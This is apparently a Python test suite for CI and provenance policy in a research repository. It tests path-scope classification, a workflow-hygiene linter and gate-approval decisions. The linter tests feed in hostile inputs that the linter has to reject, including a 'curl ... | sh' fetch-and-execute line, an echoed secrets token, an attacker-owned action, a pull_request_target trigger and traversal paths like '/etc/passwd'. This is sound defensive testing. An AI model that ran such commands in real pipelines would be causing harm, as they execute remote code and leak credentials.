"""E18 CI/provenance policy: scope guard against the PR merge base, workflow hygiene and the gate-state decision matrix.

The workflow guard is executed on bounded temporary Git histories; nothing here edits a canonical record or runs a generator.
"""
import copy
import json
import os
from pathlib import Path
import re
import shlex
import subprocess
import sys
import textwrap

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT / "tests"))
import b2_e16_policy as P  # noqa: E402
import b2_e17_evidence as E  # noqa: E402
import b2_e18_ci_policy as CI  # noqa: E402
from test_b2_e17_evidence import custody, integrated  # noqa: E402,F401

WORKFLOWS = ROOT / ".github/workflows"
E18 = WORKFLOWS / "b2-e18-lifecycle-ci.yml"
GUARD = "Scope and provenance guard against the PR merge base (not a frozen snapshot)"


# ---- classification and scope -------------------------------------------------------------------------------------------

@pytest.mark.parametrize("path,expected", [
    ("src/geoml/train.py", "frozen_science"), ("src/geosim/dual.py", "frozen_science"), ("configs/b2_base.json", "frozen_science"),
    ("pyproject.toml", "frozen_science"), ("docs/plan/P18_b2_protocol.md", "frozen_science"),
    ("docs/plan/b2_e9_approved_scientific_protocol.json", "frozen_science"), ("docs/results/k17d_drift_audit.json", "frozen_science"),
    ("docs/plan/b2_readiness_gates_2026-10-21.json", "canonical_authority"), ("docs/plan/b2_e5_decision_recommendations.json", "canonical_authority"),
    ("docs/plan/B2_E8_GO_NO_GO.md", "canonical_authority"),
    ("docs/plan/B2_E15_DR04_DECISION_DOSSIER.md", "historical_evidence"), ("docs/results/B2_E16_VERIFICATION.md", "historical_evidence"),
    ("docs/plan/B2_E17_TRUSTED_RELEASE_EVIDENCE.md", "historical_evidence"), ("docs/operations/B2_E15_HOST_QUALIFICATION.md", "historical_evidence"),
    ("scripts/b2_e16_policy.py", "reviewed_contract"), ("scripts/b2_e17_evidence.py", "reviewed_contract"), ("scripts/b2_e13_generation_plan.py", "reviewed_contract"),
    ("tests/test_b2_e17_evidence.py", "reviewed_contract"), (".github/workflows/b2-readiness-ci.yml", "reviewed_contract"),
    (".github/workflows/b2-e17-evidence-ci.yml", "reviewed_contract"), ("scripts/b2_production_supervisor.py", "reviewed_contract"),
    ("scripts/b2_e18_lifecycle.py", "unclassified"), ("docs/plan/DURUM.md", "unclassified"), ("README.md", "unclassified"),
])
def test_paths_fall_in_the_expected_protection_class(path, expected):
    assert CI.classify(path) == expected


def test_the_e18_scope_allows_only_e18_artifacts_and_the_status_log():
    ok = CI.check_diff(["scripts/b2_e18_lifecycle.py", "scripts/b2_e18_synthetic.py", "scripts/b2_e18_ci_policy.py", "tests/test_b2_e18_recovery.py",
                        "tests/e18_support.py", "docs/plan/B2_E18_EXECUTOR_LIFECYCLE.md", "docs/operations/B2_E18_STAGE_BOUNDARY_CHECKLIST.md",
                        "docs/results/B2_E18_VERIFICATION.md", ".github/workflows/b2-e18-lifecycle-ci.yml", "docs/plan/DURUM.md"])
    assert ok["ok"] and ok["violations"] == [] and ok["execution_permitted"] is False and ok["authorizes_nothing"] is True
    assert CI.check_diff([])["ok"]


@pytest.mark.parametrize("path,kind", [
    ("configs/b2_feat.json", "frozen_science"), ("src/geosim/new_module.py", "frozen_science"), ("pyproject.toml", "frozen_science"),
    ("docs/plan/b2_readiness_gates_2026-10-21.json", "canonical_authority"), ("docs/plan/b2_e5_decision_recommendations.json", "canonical_authority"),
    ("docs/results/B2_E17_VERIFICATION.md", "historical_evidence"), ("docs/plan/B2_E15_RELEASE_SEQUENCE.md", "historical_evidence"),
    ("scripts/b2_e16_ledger.py", "reviewed_contract"), ("scripts/b2_e17_git.py", "reviewed_contract"), ("tests/test_b2_e16_safety.py", "reviewed_contract"),
    (".github/workflows/b2-readiness-ci.yml", "reviewed_contract"), (".github/workflows/b2-e16-integration-ci.yml", "reviewed_contract"),
    ("scripts/new_tool.py", "outside_scope"), ("README.md", "outside_scope"), ("tests/test_something_else.py", "outside_scope"),
    ("docs/plan/B2_E19_PLAN.md", "outside_scope"), ("data/dump.npz", "outside_scope"),
])
def test_a_protected_or_out_of_scope_change_fails_the_guard(path, kind):
    report = CI.check_diff(["scripts/b2_e18_lifecycle.py", path])
    assert not report["ok"] and [v["path"] for v in report["violations"]] == [path] and report["violations"][0]["class"] == kind


@pytest.mark.parametrize("path", ["../outside", "/etc/passwd", "scripts/../src/x.py", "a\\b", "scripts/b2_e18_x.py\n", "", "scripts//x.py", "scripts/b2_e18 x.py", None, 5])
def test_unsafe_path_names_are_violations_not_matches(path):
    report = CI.check_diff([path])
    assert not report["ok"] and report["violations"][0]["class"] == "unsafe_path"


def test_an_unknown_profile_is_refused():
    with pytest.raises(ValueError):
        CI.check_diff(["scripts/b2_e18_x.py"], profile="e19")


# ---- the workflow guard, executed on temporary histories ---------------------------------------------------------------------

def git(repo, *args):
    return subprocess.run(["git", "-c", "core.fsmonitor=false", "-c", "user.name=E18 fixture", "-c", "user.email=fixture@example.invalid", *args],
                          cwd=repo, capture_output=True, text=True, timeout=30, check=True).stdout.strip()


def commit(repo, message="synthetic"):
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", message)
    return git(repo, "rev-parse", "HEAD")


def write(repo, relative, text="# synthetic\n"):
    path = repo / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def guard_body():
    source = E18.read_text()
    marker = "      - name: " + GUARD + "\n        run: |\n"
    assert source.count(marker) == 1
    return textwrap.dedent(source.split(marker, 1)[1].split("\n      - ", 1)[0])


@pytest.fixture
def history(tmp_path):
    repo = tmp_path / "metadata-repository"
    (repo / "scripts").mkdir(parents=True)
    (repo / "scripts/b2_e18_ci_policy.py").write_bytes((ROOT / "scripts/b2_e18_ci_policy.py").read_bytes())
    for relative in ("configs/b2_base.json", "docs/plan/b2_readiness_gates_2026-10-21.json", "docs/plan/B2_E16_PRODUCTION_INTEGRATION.md",
                     "scripts/b2_e16_policy.py", "src/geoml/existing.py", "docs/plan/DURUM.md", ".github/workflows/b2-readiness-ci.yml"):
        write(repo, relative, "# baseline\n")
    git(repo, "init", "-q", "-b", "main")
    return repo, commit(repo, "baseline")


def run_guard(repo, base):
    body = guard_body().replace("${{ github.event.pull_request.base.sha }}", base)
    assert "${{" not in body
    return subprocess.run(["bash", "-e", "-c", body.replace("python scripts", f"{shlex.quote(sys.executable)} scripts")], cwd=repo,
                          capture_output=True, text=True, timeout=60, env={**os.environ, "PATH": os.environ["PATH"]})


def test_reviewed_e18_additions_pass_the_guard(history):
    repo, base = history
    for relative in ("scripts/b2_e18_lifecycle.py", "tests/test_b2_e18_lifecycle.py", "tests/e18_support.py", "docs/plan/B2_E18_EXECUTOR_LIFECYCLE.md",
                     ".github/workflows/b2-e18-lifecycle-ci.yml"):
        write(repo, relative)
    write(repo, "docs/plan/DURUM.md", "# E18 status\n")
    commit(repo)
    result = run_guard(repo, base)
    assert result.returncode == 0, result.stdout + result.stderr


@pytest.mark.parametrize("relative", ["configs/b2_base.json", "docs/plan/b2_readiness_gates_2026-10-21.json", "docs/plan/B2_E16_PRODUCTION_INTEGRATION.md",
                                      "scripts/b2_e16_policy.py", "src/geoml/existing.py", ".github/workflows/b2-readiness-ci.yml", "README.md"])
def test_an_altered_protected_record_or_out_of_scope_file_fails_even_beside_legitimate_changes(history, relative):
    repo, base = history
    write(repo, "scripts/b2_e18_lifecycle.py")
    write(repo, relative, "# ALTERED SYNTHETIC RECORD\n")
    commit(repo)
    result = run_guard(repo, base)
    assert result.returncode == 1 and relative in result.stdout


def test_deleting_or_renaming_a_protected_file_is_also_caught(history):
    repo, base = history
    git(repo, "mv", "configs/b2_base.json", "scripts/b2_e18_renamed.json")
    commit(repo)
    result = run_guard(repo, base)
    assert result.returncode == 1 and "configs/b2_base.json" in result.stdout
    repo2 = repo.parent / "second"
    repo2.mkdir()
    subprocess.run(["git", "clone", "-q", str(repo), str(repo2)], check=True)
    git(repo2, "reset", "-q", "--hard", base)
    os.remove(repo2 / "src/geoml/existing.py")
    commit(repo2)
    assert run_guard(repo2, base).returncode == 1


def test_the_comparison_base_is_the_current_reviewed_tree_not_a_frozen_snapshot(history):
    repo, snapshot = history
    write(repo, "src/geoml/existing.py", "# legitimately changed by an earlier, reviewed and merged pull request\n")
    reviewed = commit(repo, "earlier merged change")
    write(repo, "scripts/b2_e18_lifecycle.py")
    commit(repo)
    assert run_guard(repo, reviewed).returncode == 0                                      # judged against the reviewed base: only E18 differs
    assert run_guard(repo, snapshot).returncode == 1                                      # a frozen snapshot would call the earlier change a violation


def test_a_branch_that_diverged_from_a_moved_base_is_judged_from_its_merge_base(history):
    repo, base = history
    git(repo, "checkout", "-q", "-b", "feature")
    write(repo, "scripts/b2_e18_lifecycle.py")
    commit(repo)
    git(repo, "checkout", "-q", "main")
    write(repo, "configs/b2_base.json", "# main moved on, with a change to a protected file\n")
    moved = commit(repo, "main moved")
    git(repo, "checkout", "-q", "feature")
    assert run_guard(repo, moved).returncode == 0                                         # the feature branch itself never touched the protected file


def test_guard_expression_is_the_only_templated_value_and_has_a_safe_fallback():
    body = guard_body()
    assert body.count("${{") == 1 and "github.event.pull_request.base.sha" in body and 'BASE="origin/main"' in body
    assert "--profile e18" in body and "check-diff" in body


# ---- workflow hygiene ---------------------------------------------------------------------------------------------------------

def test_every_existing_workflow_passes_the_hygiene_lint():
    report = CI.lint_directory(WORKFLOWS)
    assert report["ok"], {k: v["problems"] for k, v in report["workflows"].items() if v["problems"]}
    assert sorted(report["workflows"]) == ["b2-e15-operational-ci.yml", "b2-e16-integration-ci.yml", "b2-e17-evidence-ci.yml",
                                          "b2-e18-lifecycle-ci.yml", "b2-readiness-ci.yml"]


def test_historical_snapshot_guards_are_fixed_commits_and_e18_is_pr_relative():
    kinds = {path.name: CI.workflow_guard_kind(path.read_text()) for path in WORKFLOWS.glob("*.yml")}
    assert kinds["b2-e15-operational-ci.yml"]["fixed_historical_commits"] == ["290f9d5b17afffeffd9f55f460a3cbbad167118b"]
    assert kinds["b2-e16-integration-ci.yml"]["fixed_historical_commits"] == ["d82873967d6eb3a3f8f75a3f0ec9f89637e5873e"]
    assert kinds["b2-e17-evidence-ci.yml"]["fixed_historical_commits"] == ["d82873967d6eb3a3f8f75a3f0ec9f89637e5873e"]
    assert kinds["b2-e18-lifecycle-ci.yml"] == {"fixed_historical_commits": [], "pr_relative": True}
    assert kinds["b2-readiness-ci.yml"] == {"fixed_historical_commits": [], "pr_relative": False}


def test_the_readiness_workflow_and_the_historical_guards_were_not_weakened():
    readiness = (WORKFLOWS / "b2-readiness-ci.yml").read_text()
    for needle in ("full_generation", "full_gpu_training", "full_loko_sweep", "NOT_AUTHORIZED", 'freeze["activation"] is False', "production_authorized"):
        assert needle in readiness, needle
    e15 = (WORKFLOWS / "b2-e15-operational-ci.yml").read_text()
    assert "current[\"state\"] == \"CLOSED_CANONICAL\"" in e15 and "git diff --exit-code 290f9d5b17afffeffd9f55f460a3cbbad167118b HEAD" in e15
    for name in ("b2-e16-integration-ci.yml", "b2-e17-evidence-ci.yml"):
        text = (WORKFLOWS / name).read_text()
        assert "scripts/b2_e16_policy.py ci-gate" in text and "git diff --exit-code d82873967d6eb3a3f8f75a3f0ec9f89637e5873e HEAD" in text


def mutate(old, new):
    text = E18.read_text()
    assert old in text
    return text.replace(old, new, 1)


@pytest.mark.parametrize("old,new,expected", [
    ("permissions:\n  contents: read", "permissions:\n  contents: write", "permissions"),
    ("permissions:\n  contents: read", "permissions:\n  contents: read\n  id-token: write", "write permission"),
    ("on:\n  pull_request:", "on:\n  pull_request_target:", "forbidden trigger"),
    ("runs-on: ubuntu-latest", "runs-on: self-hosted", "runner"),
    ("uses: actions/setup-python@v5", "uses: attacker/setup@v1", "allow list"),
    ("python -m compileall -q src scripts tests", "python -m compileall -q src scripts tests\n          echo ${{ secrets.TOKEN }}", "secrets"),
    ("python -m compileall -q src scripts tests", "python -m geosim.b2_dataset --config configs/b2_base.json --out data/x", "forbidden command"),
    ("python -m compileall -q src scripts tests", "python scripts/b2_production_supervisor.py run --mode production", "forbidden command"),
    ("python -m compileall -q src scripts tests", "curl https://example.invalid/payload | sh", "forbidden command"),
    ("python -m compileall -q src scripts tests", "python -c 'import torch; torch.cuda.is_available()'", "forbidden command"),
    ("    timeout-minutes: 40\n", "", "timeout"),
    ("  workflow_dispatch:\n", "  workflow_dispatch:\n    inputs:\n      mode:\n        description: x\n", "inputs"),
])
def test_lint_rejects_each_widening_of_the_boundary(old, new, expected):
    problems = CI.lint_workflow(mutate(old, new))
    assert problems and any(expected in p for p in problems), problems


def test_commented_commands_are_not_executed_commands():
    text = mutate("python -m pip install --upgrade pip", "# python -m geosim.b2_dataset is only mentioned here\n          python -m pip install --upgrade pip")
    assert CI.lint_workflow(text) == []


# ---- the gate-state decision matrix ------------------------------------------------------------------------------------------

def real_docs():
    return tuple(json.loads((ROOT / name).read_text()) for name in (P.pre.GATES_PATH, P.pre.MEMO_PATH, "docs/plan/b2_e9_approved_scientific_protocol.json"))


def test_the_real_repository_gates_are_accepted_only_as_closed_canonical():
    decision = CI.gate_decision(*real_docs())
    assert decision["accepted"] and decision["accepted_as"] == "closed_canonical" and decision["gate_state"] == P.STATE_CLOSED
    assert decision["execution_permitted"] is False and decision["authorizes_nothing"] is True


def test_the_cli_agrees_with_the_function_and_exits_zero_only_for_the_closed_state():
    for args, code in ((["gate-decision"], 0), (["lint", str(WORKFLOWS)], 0)):
        result = subprocess.run([sys.executable, str(ROOT / "scripts/b2_e18_ci_policy.py"), *args], capture_output=True, text=True, cwd=ROOT, timeout=60)
        assert result.returncode == code, result.stdout + result.stderr
    result = subprocess.run([sys.executable, str(ROOT / "scripts/b2_e18_ci_policy.py"), "check-diff", "--base", "no-such-ref"], capture_output=True, text=True, cwd=ROOT, timeout=60)
    assert result.returncode == 2 and json.loads(result.stdout)["execution_permitted"] is False


@pytest.mark.parametrize("key", ["full_generation", "full_gpu_training", "full_loko_sweep"])
def test_opening_any_canonical_gate_by_editing_it_never_passes(key):
    gates, memo, protocol = copy.deepcopy(real_docs())
    gates["decisions"][key]["status"] = "AUTHORIZED"
    assert CI.gate_decision(gates, memo, protocol)["accepted"] is False
    memo["decisions"][key]["status"] = "AUTHORIZED"
    assert CI.gate_decision(gates, memo, protocol)["accepted"] is False


def test_a_forged_benchmark_complete_or_scientific_flag_is_rejected():
    gates, memo, protocol = copy.deepcopy(real_docs())
    protocol["production_authorized"] = True
    assert CI.gate_decision(gates, memo, protocol)["accepted"] is False
    gates, memo, protocol = copy.deepcopy(real_docs())
    gates["benchmark_complete"] = True
    assert CI.gate_decision(gates, memo, protocol)["accepted"] is False


@pytest.fixture
def open_candidate(integrated):
    reference = integrated["reference"]
    assert P.classify_gates(reference["gates"], reference["memo"], reference["scientific_protocol"])["state"] == P.STATE_CANDIDATE
    return reference["gates"], reference["memo"], reference["scientific_protocol"]


def test_an_approved_shaped_gate_never_passes_while_no_production_trust_root_exists(open_candidate):
    assert E.PINNED_TRUST_ROOT is None
    forged = {"ok": True, "state": P.STATE_VALID, "evidence_scope": "PRODUCTION_ROOT", "execution_permitted": False}
    for report in (None, {}, forged, {**forged, "evidence_scope": "SYNTHETIC_TEST_ROOT"}):
        decision = CI.gate_decision(*open_candidate, trusted=report)
        assert decision["accepted"] is False and "no production trust root" in decision["reason"]
        assert decision["execution_permitted"] is False


def test_the_future_matrix_with_a_hypothetical_production_root_is_strict(open_candidate, monkeypatch, custody):
    monkeypatch.setattr(E, "PINNED_TRUST_ROOT", custody["root"])                    # a hypothetical future configuration, in this test only
    valid = {"ok": True, "state": P.STATE_VALID, "evidence_scope": "PRODUCTION_ROOT"}
    cases = [(None, False, "no verified record"), ({"ok": False, "state": P.STATE_DENIED, "evidence_scope": "PRODUCTION_ROOT"}, False, "no verified record"),
             ({**valid, "state": P.STATE_CANDIDATE}, False, "no verified record"), ({**valid, "ok": "yes"}, False, "no verified record"),
             ({**valid, "evidence_scope": "SYNTHETIC_TEST_ROOT"}, False, "not a production trust root"), ({**valid, "evidence_scope": None}, False, "not a production trust root"),
             (valid, True, "document_level")]
    for report, accepted, reason in cases:
        decision = CI.gate_decision(*open_candidate, trusted=report)
        assert decision["accepted"] is accepted and reason in (decision["reason"] if not accepted else decision["accepted_as"] + decision["reason"]), (report, decision)
        assert decision["execution_permitted"] is False and decision["authorizes_nothing"] is True and decision["production_launch_enabled"] is False


def test_inconsistent_gate_documents_are_rejected_in_every_trust_configuration(open_candidate, monkeypatch, custody):
    gates, memo, protocol = copy.deepcopy(open_candidate)
    gates["decisions"]["full_gpu_training"]["status"] = "AUTHORIZED"                 # over-broad: opens a stage that stays closed
    for root in (None, custody["root"]):
        monkeypatch.setattr(E, "PINNED_TRUST_ROOT", root)
        decision = CI.gate_decision(gates, memo, protocol, trusted={"ok": True, "state": P.STATE_VALID, "evidence_scope": "PRODUCTION_ROOT"})
        assert decision["accepted"] is False and decision["gate_state"] == P.STATE_DENIED


def test_the_policy_script_declares_no_execution_surface():
    import ast
    tree = ast.parse((ROOT / "scripts/b2_e18_ci_policy.py").read_text())
    imported = {a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    imported |= {(n.module or "").split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
    assert not imported & {"numpy", "torch", "geosim", "geoml", "socket", "urllib", "requests"}
    calls = [ast.unparse(n.func) for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)]
    assert [c for c in calls if c.startswith("subprocess.")] == ["subprocess.run"]      # exactly one: read-only git
    text = (ROOT / "scripts/b2_e18_ci_policy.py").read_text()
    for needle in ("os.environ", "getenv", "os.system", "shell=True", "git push", "git commit"):
        assert needle not in text.replace('"git push"', "").replace("r\"\\bgit\\s+push\\b\"", ""), needle
